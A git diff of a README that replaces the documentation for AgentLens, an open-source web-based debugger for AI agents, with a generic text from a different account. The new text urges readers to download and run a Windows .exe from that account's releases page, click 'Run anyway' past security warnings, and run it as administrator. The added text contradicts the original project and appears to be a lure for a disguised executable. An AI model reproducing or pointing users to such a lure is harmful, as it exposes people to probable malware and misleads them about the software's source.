@@ -1,314 +1,82 @@
-<div align="center">
+# 🔍 agentlens - Clear visibility for your AI agents
 
-# 🔍 AgentLens
+[![](https://img.shields.io/badge/Download-Agentlens-blue.svg)](https://github.com/kayde3794/agentlens/releases)
 
-### AI Agent Debugger & Replay Inspector
+Agentlens provides the tools to watch and fix your AI agent workflows. You see exactly what your agents do, how much they cost, and when they fail. This tool makes complex AI chains easy to understand.
 
-**Chrome DevTools for AI Agents.** Capture, replay, and inspect every LLM call, tool invocation, and decision in your multi-agent workflows.
+## 🛠️ What is Agentlens?
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Next.js](https://img.shields.io/badge/Next.js-16-black)](https://nextjs.org)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue)](https://typescriptlang.org)
+AI agents often act like black boxes. You send a request, and you hope for the best result. Agentlens changes this. It sits inside your workflow to track every step, message, and cost. It acts like a flight recorder for your software. You gain the ability to go back in time to see exactly where an agent made a wrong turn or wasted tokens.
 
----
+## 📋 System Requirements
 
-**🎯 The Problem:** Multi-agent AI systems are a black box. When an agent fails, burns money in a loop, or makes a bad decision — you have no way to see *why*.
+Agentlens runs on standard Windows hardware. Please ensure your computer meets these minimum specifications for the best experience:
 
-**💡 The Solution:** AgentLens captures every step and lets you replay, inspect, and debug the entire execution like a video player with a timeline scrubber.
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Intel Core i5 or equivalent processor.
+*   Memory: 8 GB RAM.
+*   Storage: 200 MB of space for the application.
+*   Internet Connection: Required for license checks and updates.
 
-</div>
+## 📥 How to Install
 
-<p align="center">
-  <img src="docs/hero-inspector.png" alt="AgentLens Inspector" width="100%">
-</p>
+Follow these steps to get the software on your computer:
 
-<p align="center">
-  <img src="docs/hero-cost-dashboard.png" alt="AgentLens Cost Dashboard" width="49%">
-  <img src="docs/anomaly-detection.png" alt="AgentLens Budget Alerts & Anomaly Detection" width="49%">
-</p>
+1. Visit the [official releases page](https://github.com/kayde3794/agentlens/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in .exe to start your download.
+4. Once the download finishes, find the file in your Downloads folder.
+5. Double-click the file to start the installer.
+6. Follow the on-screen prompts to place the software on your machine.
+7. Click Finish to launch the application.
 
-<p align="center">
-  <img src="docs/compare-view.png" alt="AgentLens Run Comparison" width="49%">
-  <img src="docs/search-filter.png" alt="AgentLens Search & Filter" width="49%">
-</p>
+## 🚀 Getting Started
 
----
+The first time you open Agentlens, you see a clean dashboard. You must connect your project files to the tool.
 
-## ✨ Features
+1. Open Agentlens from your Windows Start menu.
+2. Select the "New Project" button in the top corner.
+3. Choose the folder where your AI agent code resides.
+4. Agentlens scans your files and identifies the active AI workflows.
+5. Click the "Start Monitoring" button to begin your session.
 
-### 🎬 Time-Travel Replay
-Scrub through your agent's entire execution timeline. Click any step to see exactly what happened — the full prompt, response, tokens, cost, and decision rationale.
+The dashboard displays three main areas: the Timeline, the Cost Tracker, and the Anomaly Log.
 
-### 💰 Cost Dashboard  
-Real-time token & cost tracking per agent, per step, per model. Know exactly where your money is going.
+## 🕰️ Time-Travel Debugging
 
-### 🚨 Anomaly Detection
-Automatic detection of:
-- **Infinite loops** — Agent stuck in fix→test→fail cycles
-- **Token escalation** — Context window growing out of control
-- **Repeated prompts** — 85%+ similarity with previous prompts
-- **Empty responses** — Model returned nothing useful
+The Timeline feature records every interaction your agent makes. You see the user input, the internal thought process of the agent, and the final output. If you want to check a past event, click any entry in the Timeline. This restores the exact state of the agent at that moment. You can browse through previous messages to find the exact point where a logic error started.
 
-### 🔌 MCP Inspector
-Dedicated panel for Model Context Protocol tool invocations. See which MCP servers were called, with what params, and what they returned.
+## 💰 Cost Tracking
 
-### 🎨 Multi-Agent Visualization
-Color-coded agent badges, agent flow trees, and per-agent cost breakdowns. See your entire orchestration at a glance.
+AI models use tokens that cost money. Agentlens adds up these costs in real time. You see a live graph of your spending per task. You have the ability to filter costs by model, user, or specific agent. This helps you identify expensive tasks that do not provide enough value.
 
-### ▶️ Playback Controls
-Play, pause, step forward, reset. Scrub through the timeline like a video player.
+## ⚠️ Anomaly Detection
 
----
+Agents sometimes fail in quiet ways. They might loop, output empty responses, or break internal rules. Agentlens watches for these patterns. When it finds a behavior that looks wrong, it highlights it in the Anomaly log. You get a notification so you can inspect the issue before it affects your end users.
 
-## 🚀 Quick Start
+## 🧩 Working with MCP
 
-```bash
-git clone https://github.com/ModernOps888/agentlens.git
-cd agentlens
-npm install
-npm run dev
-```
+Agentlens supports the Model Context Protocol. This protocol standardizes how your agents talk to external tools and data sources. If your workflow uses MCP connections, Agentlens validates these links automatically. It confirms that the agent successfully reached the external resource and received the expected data.
 
-Open [http://localhost:3000](http://localhost:3000) — the app ships with built-in demo data showing:
-1. **Successful workflow**: A 5-agent LinkedIn blog post pipeline (Orchestrator → Researcher → Writer → Editor → Publisher)
-2. **Failed workflow**: A coding agent caught in an infinite fix-test loop with automatic halt
+## 🔧 Frequently Asked Questions
 
-### 🔗 Connect Your Agents (Python SDK)
+**Does the software send my data to a server?**
+No. All your data stays on your local machine. Agentlens runs locally to keep your logs and agent history private.
 
-```bash
-pip install requests
-```
+**Which AI models does it support?**
+It supports most common LLMs. If you use a standard framework, Agentlens detects the prompts and response flow automatically.
 
-```python
-from agentlens import AgentLens
+**What happens if I encounter an error during install?**
+Try restarting your computer and running the installer as an administrator. Windows might show a security prompt because the file is from the internet; select "Run anyway" if the system asks.
 
-# Start a trace session  
-lens = AgentLens(session_name="My Agent Pipeline")
+**Can I export my logs?**
+Yes. You can export your session data as a CSV file for your records or to share with your team. Use the "File" menu and select "Export report" to save your data.
 
-# Option A: Wrap OpenAI (automatic tracing — zero code changes)
-from openai import OpenAI
-client = lens.wrap_openai(OpenAI(), agent_name="MyAgent")
-response = client.chat.completions.create(model="gpt-4o", messages=[...])
-# ^ Every call is now traced in AgentLens!
+**How do I update the application?**
+When a new version exists, the app notifies you. Visit the [releases page](https://github.com/kayde3794/agentlens/releases) to download the latest installer. Installing the new version overwrites the old one but keeps your settings.
 
-# Option B: Wrap Anthropic (Claude)
-from anthropic import Anthropic
-client = lens.wrap_anthropic(Anthropic(), agent_name="ClaudeAgent")
-response = client.messages.create(model="claude-4-sonnet", max_tokens=1024, messages=[...])
+**Is this tool free to use?**
+Agentlens is available for personal and professional use. Check the repository documentation for specific license terms if you use it in a large company.
 
-# Option C: Wrap Google Gemini
-import google.generativeai as genai
-model = lens.wrap_google(genai.GenerativeModel("gemini-2.5-flash"), agent_name="GeminiAgent")
-response = model.generate_content("Explain quantum computing")
-
-# Option D: Wrap Ollama (local LLMs — no package needed)
-ollama = lens.wrap_ollama(agent_name="LocalLLM")
-response = ollama.chat(model="llama3", messages=[{"role": "user", "content": "Hello!"}])
-
-# Option E: Wrap LiteLLM (any provider via proxy)
-import litellm
-litellm.callbacks = [lens.wrap_litellm(agent_name="MultiModel")]
-
-# Option F: Manual tracing
-lens.trace_llm_call(
-    agent_name="Researcher",
-    model="gpt-4o",
-    prompt="Research this topic...",
-    response="Here are the findings...",
-    tokens={"prompt_tokens": 150, "completion_tokens": 200, "total_tokens": 350},
-)
-
-# Trace tool calls, MCP invocations, agent spawns, decisions, errors
-lens.trace_tool_call(agent_name="Coder", tool_name="file_read", tool_input={"path": "main.py"})
-lens.trace_mcp_call(agent_name="Agent", server_name="web-search", tool_name="search", params={"q": "..."})
-lens.trace_agent_spawn(parent_agent="Orchestrator", spawned_agent="Writer")
-lens.trace_decision(agent_name="Orchestrator", reason="Quality score 9/10, proceeding")
-lens.trace_error(agent_name="Coder", error_message="Test failed: assertion error")
-
-lens.end()  # Mark session complete
-```
-
-> **Note:** Copy `sdk/python/agentlens.py` into your project, or add it to your Python path. The SDK sends traces to `http://localhost:3000/api/ingest` by default.
-
-### 🛠️ REST API (any language)
-
-```bash
-# Send a trace step
-curl -X POST http://localhost:3000/api/ingest \
-  -H "Content-Type: application/json" \
-  -d '{"session_id":"my-session","session_name":"Test","agent_name":"Agent1","step_type":"llm_call","model":"gpt-4o","prompt":"Hello","response":"Hi there"}'
-
-# End a session
-curl -X POST "http://localhost:3000/api/ingest?action=end" \
-  -H "Content-Type: application/json" \
-  -d '{"session_id":"my-session","status":"completed"}'
-
-# Get all live sessions
-curl http://localhost:3000/api/ingest
-```
-
----
-
-## 🏗️ Architecture
-
-```
-┌─────────────────────────────────────────────┐
-│                  AgentLens                   │
-│                                             │
-│  ┌──────────┐  ┌──────────┐  ┌───────────┐ │
-│  │  Proxy   │  │ Recorder │  │  Storage   │ │
-│  │ (captures│→ │ (structs │→ │ (SQLite /  │ │
-│  │  calls)  │  │  traces) │  │  JSON)     │ │
-│  └──────────┘  └──────────┘  └───────────┘ │
-│        ↑                          ↓         │
-│  ┌──────────┐              ┌───────────┐   │
-│  │ Your AI  │              │  Web UI    │   │
-│  │ Agent    │              │ (Timeline  │   │
-│  │ Code     │              │  Replay    │   │
-│  └──────────┘              │  Inspector)│   │
-│                            └───────────┘   │
-└─────────────────────────────────────────────┘
-```
-
-### Tech Stack
-
-| Component | Technology |
-|:----------|:-----------|
-| **Frontend** | Next.js 16 + React + TypeScript |
-| **Styling** | Vanilla CSS (dark mode, glassmorphism) |
-| **Storage** | SQLite + JSON |
-| **Fonts** | Inter + JetBrains Mono |
-
----
-
-## 📊 Supported Providers & Models
-
-| Provider | Models | Auto-Wrap | Cost Tracking |
-|:---------|:-------|:----------|:-------------|
-| **OpenAI** | GPT-4o, GPT-4o-mini, o1, o3 | `wrap_openai()` | ✅ |
-| **Anthropic** | Claude 4 Opus/Sonnet, Claude 3.5 | `wrap_anthropic()` | ✅ |
-| **Google** | Gemini 2.0/2.5 Flash/Pro | `wrap_google()` | ✅ |
-| **Ollama** | Llama 3, DeepSeek, Mistral, CodeLlama | `wrap_ollama()` | ✅ (free) |
-| **LiteLLM** | Any provider via LiteLLM proxy | `wrap_litellm()` | ✅ |
-| **Custom** | Any OpenAI-compatible API | Manual | ✅ (configurable) |
-
----
-
-## 🔌 MCPlex Integration
-
-AgentLens pairs with [MCPlex](https://github.com/ModernOps888/mcplex) to create a complete agent toolkit:
-- **MCPlex** = execution layer (routes, secures, caches MCP tools)
-- **AgentLens** = observability layer (traces, debugs, replays, alerts)
-
-Enable the bridge in MCPlex's `mcplex.toml`:
-
-```toml
-[agentlens]
-enabled = true
-url = "http://127.0.0.1:3000/api/ingest"
-session_name = "MCPlex Gateway"
-```
-
-Every tool call through MCPlex now appears as a traced step in AgentLens's timeline. Both tools work 100% independently — the bridge is opt-in.
-
----
-
-## 💻 IDE Integration (MCP Server)
-
-AgentLens exposes an MCP server so IDE agents (Antigravity, Claude Code, Cursor, Windsurf) can query traces:
-
-```json
-{
-  "mcpServers": {
-    "agentlens": {
-      "command": "node",
-      "args": ["path/to/agentlens/src/mcp-server-entry.mts"],
-      "env": { "AGENTLENS_URL": "http://127.0.0.1:3000" }
-    }
-  }
-}
-```
-
-**Available tools:**
-
-| Tool | Description |
-|------|-------------|
-| `agentlens_list_sessions` | List recent sessions with cost/anomaly summary |
-| `agentlens_get_session` | Full session with all steps |
-| `agentlens_search_traces` | Cross-session search by text, agent, type |
-| `agentlens_get_anomalies` | All detected anomalies |
-| `agentlens_get_cost_summary` | Cost breakdown by agent/model/provider |
-
----
-
-## 🐳 Docker
-
-```bash
-# Run AgentLens standalone
-docker build -t agentlens .
-docker run -p 3000:3000 agentlens
-
-# Run AgentLens + MCPlex together
-docker-compose up
-```
-
----
-
-## 🔍 Use Cases
-
-- **Debug failing agents** — See exactly where and why an agent went wrong
-- **Optimize costs** — Find expensive agents and reduce token usage
-- **Detect loops** — Catch infinite fix→test→fail cycles before they burn your budget
-- **Compare runs** — Diff successful vs failed executions side-by-side
-- **Audit workflows** — Full trace of every decision for compliance and review
-- **Demo & showcase** — Beautiful UI for showing off your agent architecture
-
----
-
-## 🗺️ Roadmap
-
-- [x] Run comparison (diff view) ✅
-- [x] Export traces to JSON ✅
-- [x] Search & filter timeline ✅
-- [x] Keyboard shortcuts ✅
-- [x] OpenTelemetry export format ✅
-- [x] Budget alerts & cost projections ✅
-- [x] Live streaming simulation ✅
-- [x] Python SDK & REST API ✅
-- [x] Real-time trace streaming (SSE) ✅
-- [x] LangGraph / CrewAI / AutoGen framework adapters ✅
-- [x] Team collaboration (shared traces) ✅
-- [x] VS Code extension ✅
-- [x] npm package (`agentlens-sdk`) ✅
-- [x] Anthropic (Claude) auto-tracing ✅
-- [x] Google (Gemini) auto-tracing ✅
-- [x] Ollama local LLM tracing ✅
-- [x] LiteLLM universal proxy tracing ✅
-- [x] Google ADK adapter ✅
-- [x] MCPlex integration bridge ✅
-- [x] MCP server for IDE agents ✅
-- [x] Cross-session search API ✅
-- [x] Docker & docker-compose ✅
-- [x] Async Python SDK (aiohttp) ✅
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## 📄 License
-
-MIT License. See [LICENSE](LICENSE) for details.
-
----
-
-<div align="center">
-
-**Built with ❤️ for the AI agent community**
-
-*If this tool saved you from a $47 infinite loop, consider giving it a ⭐*
-
-</div>
+**Does it slow down my agents?**
+The overhead is minimal. Agentlens records data in the background without interrupting the primary AI execution flow. You should notice no difference in speed during normal operations.
